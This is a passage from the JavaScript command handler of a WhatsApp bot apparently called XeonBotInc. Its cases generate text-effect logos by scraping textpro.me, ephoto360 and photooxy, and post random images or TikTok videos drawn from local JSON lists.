if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
XeonBotInc.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replygcxeon(`Example : ${prefix+command} XeonBotInc`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
XeonBotInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{

if (!q) return replygcxeon(`Example : ${prefix+command} XeonBotInc`) 
reply(mess.wait)
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
XeonBotInc.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'pornhub':{
if(!q) return replygcxeon(`Example: ${prefix + command} ajg | ea`)
reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuphub = await textpro2("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anuphub)
XeonBotInc.sendMessage(from,{image:{url:anuphub}, caption:"Ini dia!!"},{quoted:m})
}
break
case 'blackpink':
  if (!q) return m.reply(`Masukan Text Nya!\n\nContoh\n${command} Blackpink`)
  let res = await fetch('https://api.lolhuman.xyz/api/textprome/blackpink', {
    method: 'POST',
    body: JSON.stringify({ text: q }),
    headers: { 'Content-Type': 'application/json', 'apikey': 'Akiraa' },
  })
  let image = await res.buffer()
  if (!image) return m.reply('Terjadi kesalahan saat mengambil gambar.')
  XeonBotInc.sendFile(m.chat, image, 'error.jpg', 'Ini Dia Kak', m, false)
  break


case 'retro':{
if(!q) return replygcxeon(`Example: ${prefix + command} ajg | ea`)
reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anutro2 = await textpro2("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anutro2)
XeonBotInc.sendMessage(from,{image:{url:anutro2}, caption:"Ini dia!!"},{quoted:m})
}
break
case '8bit':{
if(!q) return replygcxeon(`Example: ${prefix + command} ajg | ea`)
reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anubit8 = await textpro2("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anubit8)
XeonBotInc.sendMessage(from,{image:{url:anubit8}, caption:"Ini dia!!"},{quoted:m})
}
break
case 'batman':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err))
   break
case '3dbox':
if(!q) return replygcxeon(`Example: ${prefix + command} ea`)
reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break
case 'lion':
  if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break
case '3davengers':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 
case 'window':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '3dspace':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg | ea`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'bokeh':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'holographic':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'thewall':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 
case 'carbon':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'whitebear':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'metallic':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'steel':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'fabric':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'ancient':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'marvel':
if(!q) return replygcxeon(`Example: ${prefix + command} ajg`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'tiktokgirl':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./MikoMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./MikoMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./MikoMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./MikoMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./MikoMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./MikoMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./MikoMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'ppcp':case 'couplepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
reply(mess.wait)
